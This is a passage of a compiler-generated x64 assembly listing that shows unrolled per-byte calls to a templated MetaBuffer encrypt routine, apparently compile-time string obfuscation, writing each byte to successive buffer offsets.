  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	b8 01 00 00 00	 mov	 eax, 1
  00b07	48 6b c0 42	 imul	 rax, rax, 66		; 00000042H
  00b0b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b12	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b16	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b1d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00b22	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b29	88 41 43	 mov	 BYTE PTR [rcx+67], al
  00b2c	b8 01 00 00 00	 mov	 eax, 1
  00b31	48 6b c0 43	 imul	 rax, rax, 67		; 00000043H
  00b35	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b3c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b40	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b47	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00b4c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b53	88 41 44	 mov	 BYTE PTR [rcx+68], al
  00b56	b8 01 00 00 00	 mov	 eax, 1
  00b5b	48 6b c0 44	 imul	 rax, rax, 68		; 00000044H
  00b5f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b66	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b6a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b71	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00b76	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b7d	88 41 45	 mov	 BYTE PTR [rcx+69], al
  00b80	b8 01 00 00 00	 mov	 eax, 1
  00b85	48 6b c0 45	 imul	 rax, rax, 69		; 00000045H
  00b89	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b90	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b94	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b9b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00ba0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ba7	88 41 46	 mov	 BYTE PTR [rcx+70], al
  00baa	b8 01 00 00 00	 mov	 eax, 1
  00baf	48 6b c0 46	 imul	 rax, rax, 70		; 00000046H
  00bb3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00bba	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00bbe	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bc5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00bca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bd1	88 41 47	 mov	 BYTE PTR [rcx+71], al
  00bd4	b8 01 00 00 00	 mov	 eax, 1
  00bd9	48 6b c0 47	 imul	 rax, rax, 71		; 00000047H
  00bdd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00be4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00be8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bef	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00bf4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bfb	88 41 48	 mov	 BYTE PTR [rcx+72], al
  00bfe	b8 01 00 00 00	 mov	 eax, 1
  00c03	48 6b c0 48	 imul	 rax, rax, 72		; 00000048H
  00c07	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c0e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c12	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c19	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00c1e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c25	88 41 49	 mov	 BYTE PTR [rcx+73], al
  00c28	b8 01 00 00 00	 mov	 eax, 1
  00c2d	48 6b c0 49	 imul	 rax, rax, 73		; 00000049H
  00c31	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c38	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c3c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c43	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00c48	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c4f	88 41 4a	 mov	 BYTE PTR [rcx+74], al
  00c52	b8 01 00 00 00	 mov	 eax, 1
  00c57	48 6b c0 4a	 imul	 rax, rax, 74		; 0000004aH
  00c5b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c62	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c66	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c6d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00c72	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c79	88 41 4b	 mov	 BYTE PTR [rcx+75], al
  00c7c	b8 01 00 00 00	 mov	 eax, 1
  00c81	48 6b c0 4b	 imul	 rax, rax, 75		; 0000004bH
  00c85	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c8c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c90	48 8b 8d f0 00
